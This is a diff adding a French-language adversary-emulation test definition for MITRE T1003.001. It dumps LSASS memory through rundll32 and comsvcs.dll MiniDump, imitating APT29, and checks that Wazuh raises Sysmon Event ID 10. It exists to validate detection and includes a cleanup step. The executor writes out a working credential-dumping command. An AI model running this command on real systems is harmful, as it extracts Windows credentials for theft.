@@ -1,0 +1,36 @@
+attack_technique: T1003.001
+display_name: OS Credential Dumping - Dump memoire LSASS via comsvcs.dll (APT29)
+
+atomic_tests:
+  - name: Dump memoire LSASS via rundll32/comsvcs.dll (LOLBin)
+    description: >
+      Effectue un dump de la memoire du processus LSASS via rundll32 et
+      comsvcs.dll (technique LOLBin sans outil tiers), conforme aux
+      procedures APT29 documentees pour la recuperation d'identifiants.
+      Non bloque par l'AV (Defender desactive) ; entierement visible pour
+      Wazuh (Sysmon Event ID 10 - ProcessAccess sur lsass.exe, regle 100112).
+      Le fichier de dump n'est ni exfiltre ni exploite hors du perimetre
+      du test.
+
+    supported_platforms:
+      - windows
+
+    input_arguments:
+      dump_path:
+        description: Chemin de sortie du fichier de dump
+        type: path
+        default: C:\Windows\Temp\lsass_poc.dmp
+
+    executor:
+      name: powershell
+      steps: >
+        1. $procId = (Get-Process lsass).Id
+        2. rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $procId
+           #{dump_path} full
+        3. Verifier l'apparition du Sysmon Event ID 10 cote Wazuh (regle
+           100112), cible sur lsass.exe.
+
+      cleanup_executor:
+        name: powershell
+        cleanup_command: >
+          Remove-Item #{dump_path} -Force -ErrorAction SilentlyContinue
